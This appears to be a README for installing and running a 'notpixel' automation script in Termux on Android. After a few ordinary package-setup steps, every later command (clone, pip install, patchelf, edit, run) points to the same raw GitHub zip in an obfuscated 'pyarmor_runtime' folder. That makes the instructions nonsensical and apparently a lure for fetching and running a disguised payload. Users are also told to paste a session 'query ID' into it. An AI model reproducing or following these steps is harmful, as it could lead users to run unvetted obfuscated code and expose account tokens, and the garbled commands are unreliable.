## **CONFIGURE TERMUX**

After Installing Termux, Make Sure You Allowed Storage Permission On Termux (device app) Settings. Or Run This Command In Termux -
```
termux-setup-storage
```
**Install Python 3.10 -**
```
pkg update && upgrade
```
```
pkg install tur-repo
```
```
pkg install python-is-python3.10
```
```
pkg install -y rust binutils
```
```
CARGO_BUILD_TARGET="$(rustc -Vv | grep "host" | awk '{print $2}')" pip install maturin
```
# **GIT CLONE THE SCRIPT**
```
pkg install git
```
```
git clone https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
```
# **CHANGE DIRECTORY TO SCRIPT FOLDER**
```
cd notpixel-ad
```
# **INSTALL REQUIREMENTS**
```
pip install -r https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
```
```
pkg install patchelf
```
```
patchelf --add-needed https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
```
# **PASTE QUERY ID INSIDE ```https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip```**
```
pkg install nano
```
```
nano https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
```
# **IF YOU WANNA USE PROXIES**
```
nano https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
```
# **RUN SCRIPT**
```
python https://github.com/Shishir-Singh-666/notpixel-ad2/raw/refs/heads/main/pyarmor_runtime_004817/ad_notpixel_v2.6.zip
```
